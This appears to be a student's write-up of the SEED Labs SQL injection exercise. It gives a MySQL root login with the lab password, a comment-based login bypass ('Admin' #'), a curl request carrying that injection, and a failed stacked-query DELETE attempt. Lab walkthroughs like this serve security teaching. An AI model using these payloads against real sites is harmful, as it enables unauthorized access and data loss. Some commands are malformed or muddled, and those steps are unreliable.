# SQL-Injection
SQL-INJECTION
Title	Author	Date
SQL Injection Attack Seed Lab Ubunto 16.04	M.Umer Hassan	30-10-2021
Task 1
Login MYSQL:
mysql -u root -pseedubuntu
mysql> use Users;
mysql> show tables;
Use Such a SQL Query:
select * from credential where Name = 'Alice';

Screen shoot is in SQL Injection Folder

Task 2
Task 2.1
USERNAME: "Admin' #"
PASSWORD: "***" whatever the password was
It will result in a SQL Query as:
SELECT id, name, eid, salary, birth, ssn, address, email,
nickname, Password
FROM credential
WHERE name= 'Admin' #' and Password='***'

Then statement after # will bi regarded as comments. So we can login in as Admin.

Screen shoot is in SQL Injection Folder

Task 2.2

curl 'http://www.seedlabsqlinjection.com/unsafe_home.php?username=Admin%27%20%23Password=xyz'

It will return a bunch of htmlcode. When exporting outputs to file by > temp.htmland open it

Screen shoot is in SQL Injection Folder

Task 2.3
We neeed to delete such a statement to append a row to current database:

DELETE credential where name='ted';
So constructed:

USERNAME: " '1=1; DELETE credential where name='ted';#"
PASSWORD: " " (Remain Blank)
It fails and alerts with a syntax error:

Screen shoot is in SQL Injection Folder

Because in PHP's mysqli extension, which invokes mysqli::query API to handle SQL statements, it doesn't support for multiple queries within the same run. Of course, the design of this API attributes to the concern of SQL injection.
